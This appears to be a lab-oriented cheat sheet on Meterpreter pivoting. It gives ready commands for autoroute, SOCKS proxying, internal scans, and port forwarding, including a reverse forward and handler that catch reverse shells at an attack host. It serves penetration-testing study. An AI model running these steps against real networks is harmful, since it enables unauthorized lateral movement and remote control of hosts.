# 🛰️ Meterpreter Tunneling & Port Forwarding Cheat Sheet

> [!info] 🧠 What is Meterpreter Pivoting?
> 
> Bash
> 
> ```
> Post-exploitation routing methodology that uses an active Meterpreter session to tunnel network traffic through a compromised host without relying on system-level SSH configurations.
> ```
> 
> 💡 Allows administrators and penetration testers to:
> 
> - **Eliminate SSH Dependency:** Pivot across internal network segments natively inside the Metasploit Framework.
>     
> - **Automate Subnet Routing:** Dynamically publish internal network interfaces to Metasploit modules via session tables.
>     
> - **Expose Internal Assets Fast:** Bind local execution interfaces directly to hidden enterprise endpoints over existing agent connections.
>     
> 
> ✔ Common in:
> 
> - Red team operations, internal multi-tier network assessments, and automated lateral movement workflows.
>     

> [!tip] 🔧 Core Idea
> 
> Bash
> 
> ```
> Local Attack Tools ↔ msfconsole (SOCKS/AutoRoute) ↔ Meterpreter Session Agent ↔ Internal Subnet
> ```
> 
> 💡 Key Architectural Flow:
> 
> - **The Pivot Agent:** An active internal session (e.g., Linux payload `backupjob`) acts as an intelligent routing endpoint.
>     
> - **The Network Split:** The Attack Host (`10.10.14.x`) uses the active agent session to communicate with the isolated network segment (`172.16.5.0/23`).
>     
> 
> ✔ Think of it as **transforming your single access shell into an enterprise-grade router. Instead of configuring separate platform tunnels manually, Meterpreter intercepts your attack traffic at the application layer and routes it down the active session channel automatically**.

# 🌳 Structure: Navigation, Proxies, & Port Relays

> [!info] 📚 Internal Discovery: Ping Sweeps
> 
> Bash
> 
> ```
> # Metasploit Native Module Execution
> meterpreter > run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23
>  
> # Linux Target Shell One-Liner
> for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done
>  
> # Windows Native CMD One-Liner
> for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"
> ```
> 
> 💡 Function:
> 
> - Generates localized ICMP sweep traffic originating directly from the pivot host's internal network interface to map live assets quickly.
>     

> [!tip] 📥 Dynamic Pivoting: AutoRoute & SOCKS Proxy
> 
> Bash
> 
> ```
> # 1. Route internal subnet queries down an active Metasploit session
> msf6 > use post/multi/manage/autoroute
> msf6 post(autoroute) > set SESSION 1
> msf6 post(autoroute) > set SUBNET 172.16.5.0
> msf6 post(autoroute) > run
>  
> # 2. Spin up a local SOCKS gateway to expose this route to external OS tools
> msf6 > use auxiliary/server/socks_proxy
> msf6 auxiliary(socks_proxy) > set SRVPORT 9050
> msf6 auxiliary(socks_proxy) > set VERSION 4a
> msf6 auxiliary(socks_proxy) > run
> ```
> 
> 💡 Logic:
> 
> - Integrates Metasploit's internal network table with your local system. Any outside software executed via `proxychains` (pointing to port 9050) safely slides down the automated MSF routing tables.
>     

# 🔐 Access Methods

|**Pivoting Flavor**|**Meterpreter Command**|**Direction**|**Primary Purpose**|
|---|---|---|---|
|**AutoRoute Table**|`run autoroute -s 172.16.5.0/23`|**Dynamic Outbound**|Permits all standard Metasploit modules to scan hidden internal networks directly.|
|**Forward Port Forward**|`portfwd add -l 3300 -p 3389 -r 172.16.5.19`|**Static Outbound**|Maps a single local interface port (`3300`) to an isolated remote port (`3389`).|
|**Reverse Port Forward**|`portfwd add -R -l 8081 -p 1234 -L 10.10.14.18`|**Static Inbound**|Opens a listener socket on the remote pivot host to catch and pull back reverse shells.|

# 🔍 Footprinting & Enumeration

> [!success] 📡 Driving Network Scans via Proxychains
> 
> Bash
> 
> ```
> # 1. Verify your local SOCKS routing parameters match your Metasploit proxy configuration
> tail -1 /etc/proxychains.conf
> # Expected: socks4  127.0.0.1 9050
>  
> # 2. Perform a full TCP connect scan against a hidden internal host over the proxy channel
> proxychains nmap 172.16.5.19 -p3389 -sT -v -Pn
> ```
> 
> 💡 Flag breakdown & execution limits:
> 
> - `-sT` **(Strict Enforcement):** Forces a full three-way TCP handshake. Proxychains intercept traffic at the socket layer and cannot process raw, half-open SYN packets (`-sS`).
>     
> - `-Pn` **(Strict Enforcement):** Skips active network discovery. Prevents host dropout issues when scanning targets that drop raw ICMP traffic by default.
>     

> [!info] 🔍 Information Revealed
> 
> - **Internal Route Integrity:** Running `run autoroute -p` outputs the active mapping path, confirming exactly which subnets are linked to the session.
>     
> - **Active Network Pipelines:** Running `netstat -antp` on your local host tracks individual tool entries (e.g., `xfreerdp` talking to local port `3300`), confirming the loopback execution line is stable.
>     

# ⚠️ Common Misconfigurations

> [!danger] 🔓 ARP Cache Delays & Mismatched SOCKS Framework Versions
> 
> Bash
> 
> ```
> Initial Network Sweeps: Running a single ping sweep returning zero active host responses
> Proxy Configuration Mismatch: proxychains.conf uses 'socks4' while msf6 runs server/socks_proxy on '5'
> ```
> 
> 💡 Impact:
> 
> - **False Negative Discovery:** Multi-layered virtual networks often require an active warmup loop to build local ARP profiles. Running your discovery sweeps twice mitigates empty response errors.
>     
> - **Tunnel Transport Breaks:** If the configuration strings do not match perfectly, tools will fail to pass traffic through the local proxy gate, logging immediate `Connection Refused` errors.
>     

# 💥 Protocol-Specific Attacks

> [!warning] ⚙️ Establishing a Local Forward TCP Relay
> 
> Bash
> 
> ```
> meterpreter > portfwd add -l 3300 -p 3389 -r 172.16.5.19
> 0xtheta@htb[/htb]$ xfreerdp /v:localhost:3300 /u:victor /p:pass@123
> ```
> 
> 💡 Impact:
> 
> - Creates an encrypted loopback tunnel on your attack machine.
>     
> - Directing your local GUI RDP tools at `localhost:3300` transparently routes the interactive desktop session through the Meterpreter agent straight onto the hidden Windows node.
>     

> [!danger] 🎯 Triggering Inverted Reverse Port Forwarding
> 
> Bash
> 
> ```
> # 1. Configure the reverse tunnel on the remote pivot host agent
> meterpreter > portfwd add -R -l 8081 -p 1234 -L 10.10.14.18
>  
> # 2. Set up your local handler listener to receive incoming payloads
> msf6 > use exploit/multi/handler
> msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
> msf6 exploit(multi/handler) > set LPORT 8081
> msf6 exploit(multi/handler) > set LHOST 0.0.0.0
> msf6 exploit(multi/handler) > run
> ```
> 
> 💡 Risk:
> 
> - Forces the remote Ubuntu server to sit and listen internally on port `1234`.
>     
> - Any hidden internal payload that runs and dials into the pivot host on port `1234` is caught, bundled, and fed backwards through the session to pop a fresh shell on your local handler port `8081`.
>     

# ⚡ Real-World Workflow

> [!success] 🧠 Attack Flow
> 
> Bash
> 
> ```
> 1. Launch an initial msfvenom executable on a compromised dual-homed host to establish a core Linux Meterpreter session.
> 2. Run 'post/multi/gather/ping_sweep' internally from the agent to rapidly locate live targets on hidden subnets.
> 3. Implement 'post/multi/manage/autoroute' to make those subnets viewable across your framework.
> 4. Spin up the 'auxiliary/server/socks_proxy' module to link your system tools with the active session routing tables.
> 5. Deploy 'proxychains nmap -sT' to audit high-value ports (like RDP 3389 or SMB 445) on internal assets.
> 6. Map target endpoints with 'portfwd add' to perform local tool authentication, or use 'portfwd add -R' to pass reverse exploit payloads home.
> ```
> 
> 💡 Always review active background tasks inside msfconsole with the 'jobs' command to ensure your local SOCKS listeners are up and stable before executing tools.

# 🧩 Mental Model

> [!quote] 🎯 Protocol Hierarchy
> 
> Bash
> 
> ```
> AutoRoute Module     → Teaching Metasploit's brain how to read an unfamiliar internal map
> SOCKS Proxy Module   → Laying a standard data track from outside tools down into Metasploit's network card
> portfwd add          → Drilling a one-way pipeline from your attack machine directly to an interior target port
> portfwd add -R       → Placing a localized collection bucket inside the network that empties backwards into your net
> ```
> 
> 💡 If you need to scan an entire subnet with multiple individual external tools, stand up an internal route and a SOCKS engine. If you want to interact heavily with one isolated service or catch a shell, drop a dedicated port forward relay.